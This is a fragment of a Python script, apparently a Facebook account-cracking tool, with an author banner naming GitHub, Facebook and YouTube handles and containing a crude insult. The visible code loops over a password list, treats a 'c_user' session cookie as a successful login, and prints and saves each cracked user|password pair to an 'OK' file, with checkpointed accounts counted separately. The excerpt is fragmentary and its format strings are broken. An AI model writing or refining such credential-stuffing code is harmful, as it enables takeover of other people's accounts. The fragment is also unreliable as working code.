...
logo=""" ___________ ᎷᎡ.ΝᎪᎻᏆᎷ ____________
____________________________________________
github   : Nahim404 Next:- Araf Er mare xudi
Facebook : Chand Muhammad Khan (Araf Er Abbu)
YouTube  : Technical Nahim (Crew Salah Uddin)
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    nt('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97ᎷᎡ.ΝᎪᎻᏆᎷ_OK.txt' % (H, P, str(len(ok))))
	    #print(' \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97ᎷᎡ.ΝᎪᎻᏆᎷ_CP.txt' % (H, P, str(len(cp))))
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ᎷᎡ.ΝᎪᎻᏆᎷ-ok] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('ᎷᎡ.ΝᎪᎻᏆᎷ-OK.txt' , 'a').write('%s\n' % wrt)
